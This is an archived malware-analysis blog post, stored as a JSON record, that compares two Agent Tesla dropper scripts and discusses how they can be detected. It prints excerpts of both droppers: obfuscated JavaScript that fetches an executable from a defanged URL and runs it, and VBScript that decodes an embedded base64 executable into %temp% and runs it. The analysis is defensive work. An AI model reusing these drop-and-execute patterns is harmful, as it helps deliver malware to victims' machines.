{
    "id": "7acaeea4-a480-41ce-aaa0-156f40261075",
    "created_at": "2023-01-12T15:05:03.889328Z",
    "updated_at": "2025-03-27T02:05:31.679768Z",
    "deleted_at": null,
    "sha1_hash": "b05d08344c14a55dfbe0ead960d6abd08d06896c",
    "title": "2022-01-03 - A Tale of Two Dropper Scripts for Agent Tesla",
    "authors": "",
    "file_creation_date": "2022-05-28T05:06:50Z",
    "file_modification_date": "2022-05-28T05:06:50Z",
    "file_size": 610951,
    "plain_text": "# A Tale of Two Dropper Scripts for Agent Tesla\n\n**forensicitguy.github.io/a-tale-of-two-dropper-scripts/**\n\n### By Tony Lambert Posted 2022-01-03 Updated 2022-03-28 6 min read\n\n\nJanuary 3, 2022\n\n\n### In this post I want to look at two script files that drop Agent Tesla stealers on affected systems and show how adversary decisions affect malware analysis and detection. If you want to follow along at home, I’m working with these samples from MalwareBazaar:\n\n The first script (hash starting with 46dd ) is crafted with love using obfuscated JavaScript and shows how an adversary made the decision to download subsequent stages rather than embed into the script. The second script (hash starting with ac05 ) is crafted with care using VBscript and shows another adversary choosing to embed a second stage into the script rather than trying to download more content.\n\n## Adversary Path - Downloading Stages\n\n### In the downloading path, we can see that the script is fairly obfuscated, but brief:\n```\n  var _0x181193=_0x2d0f;(function(_0x2af778,_0x402c31){var _0x2500ec=_0x2d0f,_0x1384b3=_0x2af778();while(!![]){try{var _0x1e4494=-par\n  (parseInt(_0x2500ec(0x1df))/0x8)+parseInt(_0x2500ec(0x1d2))/0x9*(parseInt(_0x2500ec(0x1d0))/0xa);if(_0x1e4494===_0x402c31)break;els\n  ActiveXObject(_0x181193(0x1ce));xhr['open'](_0x181193(0x1d6),url,![]),xhr[_0x181193(0x1da)]();function _0x4335(){var _0x9dcd91=\n  ['2406210dsHjnj','693904PWufDQ','9vwQAXw','WScript.Shell','Write','237552VRkBbi','GET','ADODB.Stream','CreateObject','ResponseBody'\n  {return _0x9dcd91;};return _0x4335();}var fso=new ActiveXObject(_0x181193(0x1cc));if(fso['FileExists'](filepath)==![]){var stream=n\n  {var _0x43355c=_0x4335();return _0x2d0f=function(_0x2d0ffa,_0x4a32bc){_0x2d0ffa=_0x2d0ffa-0x1c8;var _0x35edeb=_0x43355c[_0x2d0ffa];\n\n We could potentially make this code prettier using a NodeJS REPL but the adversary chose to leave most of the essential stuff in plaintext for us. The strings MSXML2.XMLHTTP and hxxp://mudanzasdistintas[.]com.ar/vvt/td.exe indicate a second stage likely comes from a downloaded executable. The string shell['Run'] indicates the script likely launches that second stage at th end. While the script is relatively short, the majority of the script contents focus on obfuscation while not actually performing effective obfuscation. Since the adversary chose this route, we can make a few hypotheses:\n\n The script is likely smaller The script contains less details about subsequent stages A wscript or cscript process will spawn the downloaded content A wscript or cscript process will establish a network connection\n\n We can test out these hypotheses using a combination of static analysis and a sandbox report. For file size, we can look at properties using\n exiftool or filesystem tools like ls .\n\n```\n\n-----\n\n```\n  remnux@remnux:~/cases/js-tesla$ exiftool documentos.js\n  ExifTool Version Number     : 12.30\n  File Name            : documentos.js\n  Directory            : .\n  File Size            : 1917 bytes\n  File Modification Date/Time   : 2022:01:03 17:33:52  05:00\n  File Access Date/Time      : 2022:01:03 17:11:34  05:00\n  File Inode Change Date/Time   : 2022:01:03 12:36:18  05:00\n  File Permissions        : -rw-r--r-  File Type            : TXT\n  File Type Extension       : txt\n  MIME Type            : text/plain\n  MIME Encoding          : us-ascii\n  Newlines            : (none)\n  Line Count           : 1\n  Word Count           : 21\n\n### This script weighs in at 1917 bytes, fairly small. From the Tria.ge sandbox report, we can also confirm wscript.exe makes a network connection and at least one file modification to write the executable.\n\n If we’re looking for detection ideas, we could look into analytics that involve wscript.exe making network connections as well as file modifications.\n\n```\n\n-----\n\n## Adversary Path Embedding Stages\n\n### In the sample that embeds a payload, we can first see that the script contains a lot of content.\n```\n  on error resume next\n  dim medo,sea,medoff\n  dim maasr\n  set helper = createobject(\"Wscript.Shell\")\n  maasr = helper.ExpandEnvironmentStrings(\"%temp%\")\n  set medo = CreateObject(\"Msxml2.DOMDocument.3.0\").CreateElement(\"base64\")\n  medo.dataType=\"bin.base64\"\n  medo.text=\"TVqQAAMAAAAEAAAA//\n  ...\n  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n  AAAA\"\n  set sea= CreateObject(\"ADODB.Stream\")\n  sea.Type=1\n  sea.Open\n  sea.Write medo.nodeTypedValue\n  sea.SavetoFile maasr & \"\\anyname.exe\",2\n  helper.run(maasr & \"\\anyname.exe\")\n  Function tttttttttttttttt ()\n  tttttttttttttttt = chr(104) & chr(101) & chr(114) & chr(111)\n  End function\n\n I’ve included the first and last parts of the script for brevity, but the exiftool output shows a significantly larger size:\n\n```\n\n-----\n\n```\n  remnux@remnux:~/cases/tesla$ exiftool TGFTR.vbs \n  ExifTool Version Number     : 12.30\n  File Name            : TGFTR.vbs\n  Directory            : .\n  File Size            : 935 KiB\n  File Modification Date/Time   : 2022:01:02 21:40:36  05:00\n  File Access Date/Time      : 2022:01:03 17:27:22  05:00\n  File Inode Change Date/Time   : 2022:01:02 16:42:17  05:00\n  File Permissions        : -rw-r--r-  File Type            : TXT\n  File Type Extension       : txt\n  MIME Type            : text/plain\n  MIME Encoding          : us-ascii\n  Newlines            : Windows CRLF\n  Line Count           : 17\n  Word Count           : 49\n\n### This script weighs in at 935KiB vs the first script’s 1917 bytes. This size difference is because the adversary chose to encode the second stage in base64 and embed it within the script. In some instances, I’ve seen adversaries embed multiple binaries into a script resulting in script sizes above 1MB. This helps the adversary avoid making network connections to get subsequent stages, but it gives defenders some extra clues. First, large scripts are more suspicious for any defenders that go hunting. Also, the more content adversaries include within their scripts, the more likely they are to trip YARA rules. We can see an example of this with these scripts.\n  remnux@remnux:~/cases/tesla$ yara-rules TGFTR.vbs \n  Base64_encoded_Executable TGFTR.vbs\n  remnux@remnux:~/cases/tesla$ yara-rules ../js  tesla/documentos.js\n\n For the VBscript containing the embedded stage, YARA detected an encoded Windows EXE. For the JS dropper that didn’t have embedded content, YARA found nothing (although a custom ruleset would work better). For this demonstration I’m using the default YARA rules included with REMnux.\n\n An additional issue embedding poses for the adversary: once a malware analyst has the first stage script, they can extract the subsequent versions easily, depending on the level of obfuscation. In this case, I could copy all of the content from TVqQ through the end of the string and paste it into its own file named mal.b64 . Then I used base64 -d to decode the file into a Windows EXE.\n\n```\n\n-----\n\n```\n  remnux@remnux:~/cases/tesla$ base64 -d mal.b64 > mal.bin \n  remnux@remnux:~/cases/tesla$ file mal.bin \n  mal.bin: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS\n  Windows\n  remnux@remnux:~/cases/tesla$ hexdump -C mal.bin | head\n  00000000 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 \n  |MZ..............|\n  00000010 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 \n  |........@.......|\n  00000020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \n  |................|\n  00000030 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 00 \n  |................|\n  00000040 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 \n  |........!..L.!Th|\n  00000050 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f |is program\n  canno|\n  00000060 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 |t be run in\n  DOS |\n  00000070 6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00 \n  |mode....$.......|\n  00000080 50 45 00 00 4c 01 03 00 fe f0 ce 61 00 00 00 00 \n  |PE..L......a....|\n  00000090 00 00 00 00 e0 00 02 01 0b 01 30 00 00 e8 0a 00 \n  |..........0.....|\n\n### Sure enough, we can see the extracted material is a Windows EXE! If you’re looking for detection ideas for this path, you can focus on the script content itself and use YARA, nework signatures, AV rules, and possibly behavioral analytics like wscript.exe spawning things it just wrote to disk.\n\n Thanks for reading!\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-01-03 - A Tale of Two Dropper Scripts for Agent Tesla.pdf"
    ],
    "report_names": [
        "2022-01-03 - A Tale of Two Dropper Scripts for Agent Tesla.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535903,
    "ts_updated_at": 1743041131,
    "ts_creation_date": 1653714410,
    "ts_modification_date": 1653714410,
    "files": {
        "pdf": "https://archive.orkl.eu/b05d08344c14a55dfbe0ead960d6abd08d06896c.pdf",
        "text": "https://archive.orkl.eu/b05d08344c14a55dfbe0ead960d6abd08d06896c.txt",
        "img": "https://archive.orkl.eu/b05d08344c14a55dfbe0ead960d6abd08d06896c.jpg"
    }
}